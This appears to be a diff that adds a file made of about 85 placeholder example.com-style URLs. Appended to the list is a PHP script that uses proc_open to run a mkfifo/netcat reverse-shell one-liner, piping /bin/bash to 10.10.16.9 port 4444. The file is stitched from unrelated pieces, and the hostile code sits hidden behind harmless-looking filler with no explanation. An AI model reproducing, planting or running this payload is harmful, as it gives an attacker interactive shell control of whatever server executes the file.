@@ -1,0 +1,107 @@
+http://badge.example.com/aftermath.aspx?back=activity
+http://www.example.com/
+http://addition.example.com/ball.aspx
+http://badge.example.net/beginner/amount
+https://www.example.com/
+http://www.example.com/
+https://www.example.edu/
+https://babies.example.com/achiever.html#badge
+http://blade.example.com/
+http://example.com/berry/airport.php
+https://actor.example.org/attraction/birthday?ball=afterthought
+http://authority.example.com/bed/border.php?boundary=basket&ants=army#birthday
+http://example.com/actor/bomb#act
+http://www.example.com/boat?behavior=bell
+http://www.example.org/
+http://www.example.org/
+https://www.example.edu/baby/bag.html
+http://www.example.com/activity/birth
+https://example.com/
+https://attack.example.net/
+https://example.com/?amusement=birth
+http://example.com/
+https://www.example.com/amusement
+https://www.example.edu/addition.aspx
+https://bite.example.org/advice/argument.php#behavior
+https://example.com/attack?bag=bear
+https://example.net/bubble
+http://www.example.com/
+http://example.org/angle
+https://www.example.edu/
+http://www.example.net/beds.aspx
+http://example.com/brother
+https://www.example.com/bell/amusement.html?afterthought=board
+https://example.com/
+https://www.example.com/
+http://example.net/
+http://www.example.com/argument.php
+http://www.example.com/adjustment/bomb
+http://www.example.com/bird/breath?air=brass
+https://www.example.com/bottle/bite
+https://www.example.com/
+https://example.com/?birth=board
+http://example.com/
+https://www.example.com/#airplane
+http://www.example.com/
+https://www.example.com/beef/breath
+https://www.example.com/birds/birthday.php
+https://branch.example.com/bait?bikes=bee
+http://example.com/
+http://example.edu/
+http://example.com/basket
+http://example.com/#bed
+https://www.example.com/airplane/arch?bat=breath
+https://example.com/
+http://example.com/
+https://www.example.com/appliance.html
+https://www.example.com/amusement/alarm
+https://example.com/bee/bear.aspx#arch
+https://example.org/
+http://www.example.com/
+http://www.example.com/aunt/bed
+https://example.com/#belief
+https://example.com/
+https://example.com/
+http://example.com/board/approval
+http://example.com/?bag=basin&art=bike
+https://example.com/#airplane
+https://bedroom.example.com/#basket
+http://www.example.com/actor/branch.aspx
+https://aftermath.example.net/act
+http://www.example.net/bit/brother.aspx
+http://www.example.edu/
+http://www.example.com/animal.aspx
+https://www.example.com/
+https://basin.example.com/
+https://basketball.example.com/
+https://www.example.net/
+https://www.example.com/back?ball=bee&brass=advice
+https://example.com/
+https://apparatus.example.net/
+https://www.example.com/
+http://example.com/
+https://example.com/believe
+https://www.example.com/
+<?php
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
+);
+
+
+$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);
+
+if (is_resource($process)) {
+
+    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.9 4444 >/tmp/f');
+    fclose($pipes[0]);
+
+    echo stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+
+    $return_value = proc_close($process);
+
+    echo "command returned $return_value\n";
+}
+?>
